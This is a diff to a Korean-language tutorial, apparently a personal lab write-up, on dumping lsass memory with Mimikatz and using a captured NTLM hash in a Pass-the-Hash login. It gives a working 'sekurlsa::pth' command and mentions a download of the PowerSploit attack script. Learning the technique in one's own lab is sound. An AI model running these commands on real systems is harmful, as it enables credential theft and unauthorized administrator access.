@@ -33,7 +33,7 @@ Pass-The-Hash는 패스워드값을 사용하는 것이 아닌 패스워드의 �
 Mimikatz를 통해서 lsass 메모리덤프 및 User ID와 NTLM Hash 값을 알아내 일반적인 비밀번호가 아닌 Hash 값으로 로그인할 예정입니다.
 
 
-#### lsass 메모리 덤프
+#### lsass 메모리 덤프 및 Pass-The-Hash를 이용하여 관리자 계정 시도
 
 * 주의사항
   mimikatz 파일을 다운로드 받은 후 관리자권한으로 실행하여야 에러가 나지 않고 아래와 같이 실행됩니다.
@@ -65,4 +65,18 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSp
 
 사진
 
-이후 
+이후 Pass-The-Hash 기능으로 NTLM hash 값을 이용하여 관리자 계정으로 접근하는 명령어를 실행합니다.
+
+```
+
+invoke-mimikatz -command '"sekurlsa::pth /user:user/domain:DESKTOP-B6EDDU2 /ntlm:c5928614e7dcd1e3ec18503cb1***** /run:powershell.exe"'
+
+```
+
+관리자 계정 접근이 정상적으로 되었는지 whoami , ipconfig 등 다양한 명령어를 시도해봅니다
+
+<img width="852" height="232" alt="image" src="https://github.com/user-attachments/assets/143ebbad-2d6a-4eb2-9d8e-7b707c94204e" />
+
+위 사진을 보니 정상적으로 제 관리자계정인 user 계정으로 정상 접근됨이 확인되었습니다.
+
+
